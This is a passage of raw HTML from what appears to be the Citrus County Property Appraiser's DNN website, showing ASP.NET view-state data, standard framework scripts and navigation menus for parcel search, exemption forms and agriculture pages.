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">
+</div>
+
+<script type="text/javascript">
+//<![CDATA[
+var theForm = document.forms['Form'];
+if (!theForm) {
+    theForm = document.Form;
+}
+function __doPostBack(eventTarget, eventArgument) {
+    if (!theForm.onsubmit || (theForm.onsubmit() != false)) {
+        theForm.__EVENTTARGET.value = eventTarget;
+        theForm.__EVENTARGUMENT.value = eventArgument;
+        theForm.submit();
+    }
+}
+//]]>
+</script>
+
+
+<script src="/_DNN/WebResource.axd?d=pynGkmcFUV0a2gDHSWsRocvCpKScriZMyA5TanECkPN7zXTw8ZF-tfEGNeM1&amp;t=639190700600000000" type="text/javascript"></script>
+
+
+<script src="/_DNN/ScriptResource.axd?d=uHIkleVeDJcDi3EsjM-20JctN2YQ6pZdrx6dCdPvgQADQfGI_bHkyqBaxNOCCRLMRIqvSTZ0HV3gVBpbke3wIN_gqz5QAOBMBf9gzEHYUfhNiLYXQkK9Y7M2SQ0YMmhQVg2enw2&amp;t=ffffffffbec1863d" type="text/javascript"></script>
+<script src="/_DNN/ScriptResource.axd?d=Jw6tUGWnA17fCk-JEWSJK6u3uWlFZK9jsfAFsGonhcp3nDompUqCa4o7mEGNgE9brWrYfghlcrGwmMiNteUu1xUi_X_Bn75mJ8jU1u9o6ZMuIGR1qWtDn5Rd7V9ZjTkewzYwJT2cFsVS2b_b0&amp;t=ffffffffbec1863d" type="text/javascript"></script>
+<div class="aspNetHidden">
+
+	<input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="88A60893">
+	<input type="hidden" name="__VIEWSTATEENCRYPTED" id="__VIEWSTATEENCRYPTED" value="">
+	<input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="PRnERr0HXuRfeitTB7OOPmG2jxW4qTqP0WrTNFh11t3Zq03xJKgQ45ekFARRKTLv4OdD7P4HEo0DCGDNyL7CDe0svttPymnWZDtpMmGz1pp4+/VL">
+</div>
+<script type="text/javascript">
+//<![CDATA[
+Sys.WebForms.PageRequestManager._initialize('ScriptManager', 'Form', [], [], [], 5400, '');
+//]]>
+</script>
+
+        <script src="/_dnn/js/dnn.modalpopup.js?cdv=866" type="text/javascript"></script><script src="/_dnn/js/dnncore.js?cdv=866" type="text/javascript"></script>
+        
+        
+        
+
+
+ <script type="text/javascript">
+var GetWebpConvertServiceUrl = '/_DNN/DesktopModules/DNNGo_ThemePluginPro/Resource_Service.aspx?Token=ServiceWebpConvert&PortalId=0&TabId=167&ModuleId=';
+</script>
+
+
+
+
+
+
+
+
+
+
+ 
+
+
+
+
+
+   
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+     <div class="page-loaders">
+      <div class="loaders">
+        <div class="page-loaders-animation" style="width:200px;height:200px;line-height:200px;font-size:200px;margin-top:-100px;margin-left:-100px; ">
+          <div class="line_l" style="border-top-color:#0388a6 ">
+            <div class="line_2" style="border-top-color:#d97925 "></div>
+            <div class="line_3" style="border-top-color:#027353 "></div>
+          </div>
+                    <div class="page-loaders-logo">
+            <img src="/_dnn/Portals/0/ThemePluginPro/uploads/2021/3/16/citrus-county-logo - Copy.png" alt="logo" srcset="/_dnn/Portals/0/ThemePluginPro/uploads/2021/3/16/citrus-county-logo - Copy.png">
+          </div>
+                  </div>
+      </div>
+    </div>
+    
+
+
+<div class="dng-main mm-page mm-slideout Wide" id="mm-content-box">
+  <div id="dng-wrapper"> 
+
+    
+      	 <div class="header-replace header-position"><header class="header_bg header-wrap header-default floating-nav floating-nav-sticky"><div id="megamenuWidthBox" class="container"></div> <div class="header-top-bg  header-bg-box" data-height="80" id="headerrow-349354"><div class="container"><div class="header-top header-container-box"> <div class="header-area area-left header-vertical  header-undefined" id="column-317022"><div class="header-content-wrap"> </div></div> <div class="header-area area-center header-vertical  header-undefined" id="column-250649"><div class="header-content-wrap"> <div class="logo" id="logo575027"><a id="dnn_dnnLOGO575027_hypLogo" title="Citrus County Property Appraiser" aria-label="Citrus County Property Appraiser" href="https://www.citruspa.org/_dnn/"><img id="dnn_dnnLOGO575027_imgLogo" class="header-logo" src="/_dnn/Portals/0/citrus-county-logo.png?ver=pwAlAG5QYHzvkRfF7Nv6Xw%3d%3d" alt="Citrus County Property Appraiser" style="border-width:0px;"></a><a id="dnn_floatingLOGO575027_hypLogo" title="Citrus County Property Appraiser" aria-label="Citrus County Property Appraiser" href="https://www.citruspa.org/_dnn/"><img id="dnn_floatingLOGO575027_imgLogo" class="floating-header-logo" src="/_dnn/Portals/0/citrus-county-logo.png?ver=pwAlAG5QYHzvkRfF7Nv6Xw%3d%3d" alt="Citrus County Property Appraiser" style="border-width:0px;"></a></div></div></div> <div class="header-area area-right header-vertical  header-undefined" id="column-727368"><div class="header-content-wrap"> </div></div> </div></div></div> <div class="header-center-bg floating-light-color header-bg-box" data-height="60" id="headerrow-349356"><div class="container"><div class="header-center header-container-box"> <div class="header-area area-left header-horizontal  header-horizontal" id="column-645135"><div class="header-content-wrap"> </div></div> <div class="header-area area-center header-horizontal text-center header-horizontal text-center" id="column-930454"><div class="header-content-wrap"> <div class="nav-bar"><div id="dng-megamenu673076" data-split="false" class="dng-megamenu hoverstyle_1 flyout-shadow mega-shadow">
+    <div class="dnngo_gomenu" id="dnngo_megamenu030a208937">
+      
+         <ul class="primary_structure">
+ <li class="dir ">
+<a href="javascript:;" title="Parcel Search"><span>Search</span></a>
+ <div class="dnngo_menuslide">
+ <ul class="dnngo_slide_menu ">
+ <li class=" ">
+<a href="http://www.citruspa.org/_web/search/commonsearch.aspx?mode=owner" title="Owner Search"><span>Owner Search</span></a>
+</li>
+ <li class=" ">
+<a href="http://www.citruspa.org/_web/search/commonsearch.aspx?mode=address" title="Address Search"><span>Address Search</span></a>
+</li>
+ <li class=" ">
+<a href="http://www.citruspa.org/_web/search/commonsearch.aspx?mode=realprop" title="Real Property Search"><span>Real Property Search</span></a>
+</li>
+ <li class=" ">
+<a href="http://www.citruspa.org/_web/search/advancedsearch.aspx?mode=advanced" title="Advanced Search"><span>Advanced Search</span></a>
+</li>
+ <li class=" ">
+<a href="http://www.citruspa.org/_web/search/commonsearch.aspx?mode=persprop" title="Personal Property Search"><span>Personal Property Search</span></a>
+</li>
+ <li class=" ">
+<a href="/_dnn/LinkClick.aspx?fileticket=RaxIWSv5Yhd1WiXmS0SZvQ%3d%3d&tabid=143&portalid=0" title="Search Help" target="_blank"><span>Search Help</span></a>
+</li>
+ <li class=" ">
+<a href="https://www.citruspa.org/_dnn/Downloads" title="Database Codes"><span>Database Codes</span></a>
+</li>
+</ul>
+</div>
+</li>
+ <li class="dir ">
+<a href="javascript:;" title="Exemptions"><span>Exemptions</span></a>
+ <div class="dnngo_menuslide">
+ <ul class="dnngo_slide_menu ">
+ <li class=" ">
+<a href="https://www.citruspa.org/_dnn/Exemptions/General-Exemption-Information" title="General Exemptions Information"><span>General Exemption Information</span></a>
+</li>
+ <li class=" ">
+<a href="https://www.citruspa.org/_dnn/Exemptions/Homestead-Application" title="Homestead Application" target="_blank"><span>Homestead Application</span></a>
+</li>
+ <li class=" ">
+<a href="https://www.citruspa.org/_dnn/Exemptions/Homestead-E-File/Efile1" title="Homestead E-File"><span>Homestead E-File</span></a>
+</li>
+ <li class=" ">
+<a href="/_dnn/LinkClick.aspx?fileticket=jB8fuZJR-wPkWRIWwfphRw%3d%3d&tabid=219&portalid=0" title="Widow/Widower Application Form" target="_blank"><span>Widow/Widower Application Form</span></a>
+</li>
+ <li class=" ">
+<a href="/_dnn/LinkClick.aspx?fileticket=gt4RS44NoauS1bGLkaIvIw%3d%3d&tabid=220&portalid=0" title="Totally & Permanently Disabled Application Form" target="_blank"><span>Totally & Permanently Disabled Application Form</span></a>
+</li>
+ <li class=" ">
+<a href="/_dnn/LinkClick.aspx?fileticket=Rqjoux02N9F6GED_3bo9lg%3d%3d&tabid=163&portalid=0" title="Portability" target="_blank"><span>Portability</span></a>
+</li>
+ <li class=" ">
+<a href="https://www.citruspa.org/_dnn/Exemptions/Annual-Assessment-Caps" title="Annual Assessment Caps"><span>Annual Assessment Caps</span></a>
+</li>
+ <li class=" ">
+<a href="/_dnn/LinkClick.aspx?fileticket=2xsX18clhT5yGyOiAOFL6A%3d%3d&tabid=99&portalid=0" title="Application for Veterans over 65 discount" target="_blank"><span>Application for Veterans over 65 discount</span></a>
+</li>
+ <li class=" ">
+<a href="http://floridarevenue.com/property/Documents/dr501m.pdf" title="Deployed Military Exemption  Application" target="_blank"><span>Deployed Military Exemption  Application</span></a>
+</li>
+ <li class=" ">
+<a href="https://floridarevenue.com/property/Pages/Home.aspx" title="FL DOR Exemption Information For Taxpayers" target="_blank"><span>FL DOR Exemption Information For Taxpayers</span></a>
+</li>
+ <li class=" ">
+<a href="http://floridarevenue.com/property/Documents/pt109.pdf" title="Active Duty Military and Veterans" target="_blank"><span>Active Duty Military and Veterans</span></a>
+</li>
+ <li class=" ">
+<a href="/_dnn/LinkClick.aspx?fileticket=b9UMRwyTy5v3uxuqjnWNAA%3d%3d&tabid=159&portalid=0" title="Veterans Exemptions Brochure" target="_blank"><span>Veterans Exemptions Brochure</span></a>
+</li>
+ <li class=" ">
+<a href="https://www.citruspa.org/_dnn/Exemptions/Exemption-Fraud" title="Exemption Fraud"><span>Exemption Fraud</span></a>
+</li>
+</ul>
+</div>
+</li>
+ <li class="dir ">
+<a href="javascript:;" title="Agriculture"><span>Agriculture</span></a>
+ <div class="dnngo_menuslide">
+ <ul class="dnngo_slide_menu ">
+ <li class=" ">
+<a href="https://www.citruspa.org/_dnn/Agriculture/Agriculture-Info" title="Agriculture Info"><span>Agriculture Info</span></a>
+</li>
+ <li class=" ">
+<a href="https://www.citruspa.org/_dnn/Agriculture/Ag-Application" title="Ag Application"><span>Ag Application</span></a>
+</li>
+ <li class=" ">
+<a href="https://www.citruspa.org/_dnn/Agriculture/Ag-FAQ" title="Ag F.A.Q."><span>Ag F.A.Q.</span></a>
+</li>
+ <li class=" ">
+<a href="/_dnn/LinkClick.aspx?fileticket=jUznvBMoHUutwxj5xBJJ-A%3d%3d&tabid=104&portalid=0" title="Agriculture Guidelines" target="_blank"><span>Agriculture Guidelines</span></a>
+</li>
+ <li class=" ">
+<a href="https://www.citruspa.org/_dnn/Agriculture/Ag-Assistance-Links" title="Ag Assistance Links"><span>Ag Assistance Links</span></a>
+</li>
+ <li class=" ">
+<a href="/_dnn/LinkClick.aspx?fileticket=pCVayOCzfPMX_k51tELc9A%3d%3d&tabid=119&portalid=0" title="Pasture Land" target="_blank"><span>Pasture Land</span></a>
+</li>
+ <li class=" ">
+<a href="/_dnn/LinkClick.aspx?fileticket=X-1iOiQNG81RmejtRkoM3g%3d%3d&tabid=118&portalid=0" title="Cropland" target="_blank"><span>Cropland</span></a>
+</li>
+ <li class=" ">
+<a href="/_dnn/LinkClick.aspx?fileticket=hkOWpILef-GrZIV2RaMxug%3d%3d&tabid=120&portalid=0" title="Timberlands" target="_blank"><span>Timberlands</span></a>
+</li>
+ <li class=" ">
+<a href="/_dnn/LinkClick.aspx?fileticket=PROb55f-5XsQ-oyCRcdhZw%3d%3d&tabid=121&portalid=0" title="Commercial Plant Nursery Operation" target="_blank"><span>Commercial Plant Nursery Operation</span></a>
+</li>
+ <li class=" ">
